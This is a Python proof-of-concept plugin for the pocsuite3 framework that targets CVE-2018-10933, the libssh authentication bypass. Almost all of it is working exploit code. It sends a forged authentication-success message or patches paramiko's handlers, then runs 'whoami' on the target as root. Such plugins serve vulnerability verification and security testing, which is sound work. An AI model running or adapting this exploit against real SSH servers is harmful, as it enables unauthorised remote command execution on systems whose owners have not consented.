"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""

import os
import socket

import paramiko

from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE


class DemoPOC(POCBase):
    vulID = '97614'
    version = '3'
    author = ['seebug']
    vulDate = '2018-10-18'
    createDate = '2018-10-17'
    updateDate = '2018-10-18'
    references = ['https://www.seebug.org/vuldb/ssvid-97614']
    name = 'libssh CVE-2018-10933 身份验证绕过漏洞'
    appPowerLink = ' https://www.libssh.org'
    appName = 'libssh'
    appVersion = '>=0.6'
    vulType = VUL_TYPE.LOGIN_BYPASS
    desc = '''libssh版本0.6及更高版本在服务端代码中具有身份验证绕过漏洞。攻击者可以在没有任何凭据的情况下成功进行身份验证。 进而可以进行一些恶意操作。'''
    samples = ['']
    install_requires = ['paramiko']
    category = POC_CATEGORY.EXPLOITS.REMOTE
    protocol = POC_CATEGORY.PROTOCOL.SSH

    def _verify(self):
        result = {}
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 22

        if password_auth_bypass_test(host, port):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Target'] = '{0}:{1}'.format(host, port)
            return self.parse_attack(result)

        if fake_key_bypass_test(host, port):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Target'] = '{0}:{1}'.format(host, port)

        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')

        return output


def password_auth_bypass_test(hostname, port):
    bufsize = 2048
    command = 'whoami'
    sock = socket.socket()
    try:
        sock.connect((hostname, int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        client = transport.open_session(timeout=10)
        client.exec_command(command)

        stdout = client.makefile("rb", bufsize)
        stderr = client.makefile_stderr("rb", bufsize)
        cmd_out = stdout.read().decode() + stderr.read().decode()
        print(cmd_out)
        return True if 'root' in cmd_out else False

    except paramiko.SSHException:
        logger.debug("TCPForwarding disabled on remote server can't connect. Not Vulnerable")
        return False
    except socket.error:
        logger.debug("Unable to connect.")
        return False


def auth_accept(*args, **kwargs):
    new_auth_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_SUCCESS]
    return new_auth_accept(*args, **kwargs)


def fake_key_bypass_test(hostname, port, username='root', keyfile=None, command='whoami'):
    try:
        if keyfile is None:
            keyfile = os.path.join(os.environ['HOME'], '.ssh', 'id_rsa')

        paramiko.auth_handler.AuthHandler._server_handler_table.update(
            {paramiko.common.MSG_USERAUTH_REQUEST: auth_accept})

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, port=int(port), username=username, password="", pkey=None, key_filename=keyfile)

        stdin, stdout, stderr = client.exec_command(command)
        cmd_output = stdout.read()
        client.close()
        return True if cmd_output == 'root' else False

    except FileNotFoundError:
        logger.debug("Generate a keyfile for tool to bypass remote/local server credentials.")
        return False
    except paramiko.SSHException:
        logger.debug("TCPForwarding disabled on remote server can't connect. Not Vulnerable")
        return False
    except socket.error:
        logger.debug("Unable to connect.")
        return False


register_poc(DemoPOC)
